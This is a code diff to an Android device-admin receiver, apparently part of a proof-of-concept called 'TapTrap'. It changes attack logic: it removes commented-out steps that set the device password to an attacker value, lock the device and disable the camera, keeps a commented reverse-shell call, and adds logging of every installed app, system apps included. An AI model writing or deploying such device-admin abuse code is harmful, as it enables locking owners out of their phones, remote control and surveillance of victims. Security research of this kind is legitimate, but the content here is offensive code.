@@ -36,25 +36,10 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         }
 
 //        launchReverseShell(context);
+        Log.d(TAG, "APP LIST:\n" + getInstalledApps(context));
 
-//        try {
-//            Thread.sleep(5000);
-//        } catch (InterruptedException e) {
-//            e.printStackTrace();
-//        }
 
-        //String pw_context = getPasswordQualityString(context);
-        //Log.d(TAG, pw_context);
-        // add command here
 
-//        String attackerPassword = "123456";
-//        boolean passwordChanged = changeDevicePassword(context, attackerPassword);
-//        lockDevice(context);
-
-        // disableCamera(context);
-        // Optional: Post-attack actions here
-        // DevicePolicyManager dpm = getManager(context);
-        // dpm.lockNow(); // Example: lock device immediately
     }
 
     // Reverse Shell Code
@@ -249,12 +234,12 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             for (ApplicationInfo app : apps) {
                 // Skip system apps (optional)
-                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                //if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                     String appName = context.getPackageManager()
                             .getApplicationLabel(app).toString();
                     sb.append("  - ").append(appName)
                             .append(" (").append(app.packageName).append(")\n");
-                }
+                //}
             }
 
             Log.d("TapTrap", "App list generated: " + apps.size() + " apps");
